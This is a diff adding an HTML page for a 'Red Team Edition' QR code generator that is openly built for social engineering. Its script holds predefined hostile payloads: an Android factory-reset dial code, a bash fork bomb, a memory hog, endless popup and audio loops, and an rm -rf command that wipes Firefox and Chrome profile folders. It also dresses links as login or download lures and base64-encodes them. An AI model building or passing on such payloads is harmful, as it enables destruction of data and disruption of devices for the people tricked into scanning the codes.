@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title> QR Generator – Red Team Edition</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:JetBrains Mono,monospace;background:#000;color:#00ff41;overflow-x:hidden}
+video{position:fixed;inset:0;width:100%;height:100%;object-fit:cover;opacity:.12;z-index:-2}
+.matrix{position:fixed;inset:0;z-index:-1;background:
+linear-gradient(90deg,transparent 48%,rgba(0,255,65,.04) 50%,transparent 52%),
+linear-gradient(0deg,transparent 48%,rgba(0,255,65,.04) 50%,transparent 52%);
+background-size:40px 40px;animation:flow 20s linear infinite}
+@keyframes flow{to{background-position:40px 40px}}
+
+.container{max-width:1000px;margin:80px auto;background:rgba(0,0,0,.85);border:1px solid #00ff41;border-radius:16px;padding:24px;box-shadow:0 0 40px rgba(0,255,65,.35)}
+.banner{text-align:center;font-size:1.4em;font-weight:800;margin-bottom:20px}
+.controls{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+label{font-size:.8em;color:#00ccff}
+input,select,button,textarea{background:#000;border:1px solid #00ff41;color:#00ff41;padding:10px;border-radius:8px;font-family:inherit}
+button{cursor:pointer;background:linear-gradient(135deg,#00ff41,#00cc33);color:#000;font-weight:800}
+button:hover{box-shadow:0 0 20px #00ff41}
+select option{color:#00ff41;background:#000}
+
+.terminal{margin-top:20px;background:#000;border:1px solid #00ff41;border-radius:10px;padding:12px;height:180px;overflow:auto;font-size:.78em}
+.term-line{margin-bottom:4px}
+.info{color:#00ccff}.ok{color:#00ff41}.err{color:#ff4444}.warning{color:#ffaa00}
+
+.output{margin-top:20px;display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px;align-items:center;justify-items:center}
+#qrCanvas>div{background:#fff;padding:12px;border-radius:10px;position:relative;animation:fadePulse 2s infinite alternate}
+@keyframes fadePulse{0%{transform:scale(1)}100%{transform:scale(1.05)}}
+
+.link-list{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
+.link-item{display:flex;gap:6px}
+.link-item input{flex:1}
+.link-item button{flex:0 0 auto;padding:0 8px}
+
+.payload-section{background:rgba(255,170,0,.1);border:1px solid #ffaa00;padding:12px;border-radius:8px;margin:10px 0}
+.payload-section label{color:#ffaa00}
+</style>
+</head>
+
+<body>
+<video autoplay muted loop playsinline>
+<source src="ca63eccfcf11bcd02c1a900196de630f_720w.mp4" type="video/mp4">
+</video>
+<div class="matrix"></div>
+
+<div class="container">
+
+<div class="banner">
+🧠 ADVANCED QR GENERATOR<br>
+<span style="font-size:.7em;color:#00ccff">Red Team | OSINT | Social Engineering | Payloads</span>
+</div>
+
+<div class="controls">
+<div>
+<label>Social Template</label>
+<select id="templateSelect">
+<option value="">-- None --</option>
+<option value="login">Login Page</option>
+<option value="survey">Survey Link</option>
+<option value="download">Download File</option>
+</select>
+</div>
+
+<div class="payload-section">
+<label>Payload Type</label>
+<select id="payloadSelect">
+<option value="custom">Custom Command</option>
+<option value="wifi">Wi-Fi Credentials</option>
+<option value="contact">Contact Information</option>
+<option value="url">URL Redirect</option>
+<option value="factory">Phone - Factory Reset ⚠️</option>
+<option value="silent">Phone - Silent Mode</option>
+<option value="brightness">Phone - Brightness Max</option>
+<option value="emergency">Phone - Emergency Dialer</option>
+<option value="security">Phone - Security Settings</option>
+<option value="appstore">Phone - App Store</option>
+<option value="camera">Phone - Open Camera</option>
+<option value="forkbomb">System - Fork Bomb 💀</option>
+<option value="memory">System - Memory Hog</option>
+<option value="popups">System - Endless Popups</option>
+<option value="update">System - Fake Update</option>
+<option value="history">System - Browser Wipe</option>
+<option value="audio">System - Audio Loop</option>
+</select>
+</div>
+
+<div>
+<label>Payload Data</label>
+<textarea id="payloadData" rows="3" placeholder="Enter payload data or command here..."></textarea>
+</div>
+
+<div class="link-list" id="linkList">
+<label>Links to Generate QR</label>
+<div class="link-item">
+<input type="text" placeholder="Add any link" class="linkInput">
+<button onclick="removeLink(this)">❌</button>
+</div>
+</div>
+<button onclick="addLink()">➕ Add Link</button>
+
+<div>
+<label>Redirect URL (optional)</label>
+<input id="redirectInput" placeholder="https://redirect.com">
+</div>
+
+<div>
+<label>UTM Source</label>
+<input id="utmSource" placeholder="newsletter">
+</div>
+<div>
+<label>UTM Medium</label>
+<input id="utmMedium" placeholder="email">
+</div>
+<div>
+<label>UTM Campaign</label>
+<input id="utmCampaign" placeholder="campaign1">
+</div>
+
+<div>
+<label>Embed Logo (PNG/JPG)</label>
+<input type="file" id="logoInput" accept="image/*">
+</div>
+
+<div>
+<label>Output Name</label>
+<input id="outputName" placeholder="qr_payload">
+</div>
+
+<button onclick="generateQRLinks()">🚀 GENERATE QR(s)</button>
+<button onclick="downloadAllQR()">💾 DOWNLOAD ALL</button>
+</div>
+
+<div class="terminal" id="terminal"></div>
+<div class="output" id="qrCanvas"></div>
+</div>
+
+<script>
+const terminal=document.getElementById('terminal');
+function log(msg,type='info'){const d=document.createElement('div');d.className=`term-line ${type}`;d.textContent=`[${new Date().toLocaleTimeString()}] ${msg}`;terminal.appendChild(d);terminal.scrollTop=terminal.scrollHeight;}
+
+const predefinedPayloads = {
+    "wifi": "WIFI:S:MyNetwork;T:WPA;P:MyPassword;;",
+    "contact": "BEGIN:VCARD\nVERSION:3.0\nN:Lastname;Firstname\nORG:Company\nTEL:1234567890\nEMAIL:email@example.com\nEND:VCARD",
+    "url": "https://example.com",
+    "factory": "*2767*3855#",
+    "silent": "intent://settings/ringtone#Intent;scheme=android;end",
+    "brightness": "intent://settings/display#Intent;scheme=android;end",
+    "emergency": "tel:911",
+    "security": "intent://settings/security#Intent;scheme=android;end",
+    "appstore": "market://details?id=com.example.app",
+    "camera": "intent://capture#Intent;scheme=android;end",
+    "forkbomb": ":(){ :|:& };:",
+    "memory": "python -c 'while True: bytearray(512 * 1024 * 1024)'",
+    "popups": "while true; do zenity --info --text='System Warning!'; done",
+    "update": "echo 'Installing system update 1 of 284...' && sleep 5",
+    "history": "rm -rf ~/.mozilla/firefox/* && rm -rf ~/.config/google-chrome/*",
+    "audio": "while true; do paplay /usr/share/sounds/gnome/default/alerts/drip.ogg; done"
+};
+
+function addLink(){
+const container=document.getElementById('linkList');
+const div=document.createElement('div');div.className='link-item';
+div.innerHTML='<input type="text" placeholder="Add any link" class="linkInput"><button onclick="removeLink(this)">❌</button>';
+container.appendChild(div);
+}
+
+function removeLink(btn){btn.parentElement.remove();}
+
+function getPayloadContent() {
+    const payloadType = document.getElementById('payloadSelect').value;
+    const payloadData = document.getElementById('payloadData').value.trim();
+    
+    if (payloadType === 'custom' || !predefinedPayloads[payloadType]) {
+        if (!payloadData) {
+            log('Custom payload requires data input', 'err');
+            return null;
+        }
+        return payloadData;
+    }
+    
+    let content = predefinedPayloads[payloadType];
+    if (payloadData) {
+        // Allow overriding predefined payloads
+        content = payloadData;
+    }
+    
+    // Special handling for some payloads
+    if (payloadType === 'wifi' && payloadData) {
+        const parts = payloadData.split('|');
+        if (parts.length >= 2) {
+            content = `WIFI:S:${parts[0]};T:WPA;P:${parts[1]};;`;
+        }
+    }
+    
+    log(`Using payload: ${payloadType} (${content.substring(0, 50)}${content.length > 50 ? '...' : ''})`, 'warning');
+    return content;
+}
+
+function applyTemplate(url){
+const tmpl=document.getElementById('templateSelect').value;
+if(tmpl==='login') return url+'?login=true';
+if(tmpl==='survey') return url+'?survey=true';
+if(tmpl==='download') return url+'?download=true';
+return url;
+}
+
+function applyUTM(url){
+const s=document.getElementById('utmSource').value;
+const m=document.getElementById('utmMedium').value;
+const c=document.getElementById('utmCampaign').value;
+if(!s && !m && !c) return url;
+const sep=url.includes('?')?'&':'?';
+return `${url}${sep}utm_source=${s}&utm_medium=${m}&utm_campaign=${c}`;
+}
+
+function obfuscate(url){
+return btoa(url);
+}
+
+async function generateQR(url, name){
+const canvasWrapper=document.createElement('div');document.getElementById('qrCanvas').appendChild(canvasWrapper);
+const qr=new QRCode(canvasWrapper,{text:url,width:260,height:260,correctLevel:QRCode.CorrectLevel.H});
+const file=document.getElementById('logoInput').files[0];
+if(file){const img=document.createElement('img');img.src=URL.createObjectURL(file);img.onload=()=>{const qrImg=canvasWrapper.querySelector('img');const size=qrImg.width/4;img.style.position='absolute';img.style.width=size+'px';img.style.left='50%';img.style.top='50%';img.style.transform='translate(-50%,-50%)';canvasWrapper.appendChild(img);log('Logo embedded','ok');};}
+canvasWrapper.dataset.name=name;return canvasWrapper;
+}
+
+async function generateQRLinks(){
+document.getElementById('qrCanvas').innerHTML='';log('Generating QR(s)...','info');
+
+// First check for payload
+const payloadContent = getPayloadContent();
+if (payloadContent) {
+    const name=document.getElementById('outputName').value||'qr_payload';
+    await generateQR(payloadContent, name + '_payload');
+    log('Payload QR generated', 'warning');
+}
+
+// Then process links
+const inputs=document.querySelectorAll('.linkInput');
+for(const input of inputs){
+    const val=input.value.trim();
+    if(!val) continue;
+    let final=applyTemplate(val);final=applyUTM(final);final=obfuscate(final);
+    const name=document.getElementById('outputName').value||'qr_output';
+    await generateQR(final,name);
+    log(`QR ready for: ${val}`,'ok');
+}
+}
+
+function downloadAllQR(){
+const qrDivs=document.querySelectorAll('#qrCanvas > div');if(!qrDivs.length){log('No QR to save','err');return;}
+qrDivs.forEach(div=>{const img=div.querySelector('img')||div.querySelector('canvas');const name=div.dataset.name||'qr_output';let url;if(img.tagName==='IMG') url=img.src;else url=img.toDataURL('image/png');const a=document.createElement('a');a.href=url;a.download=name+'.png';a.click();log(`Saved QR: ${name}`,'ok');});
+}
+
+log('SYSTEM READY – Payloads + Multi-QR + Obfuscation + UTM + Templates','ok');
+</script>
+</body>
+</html>
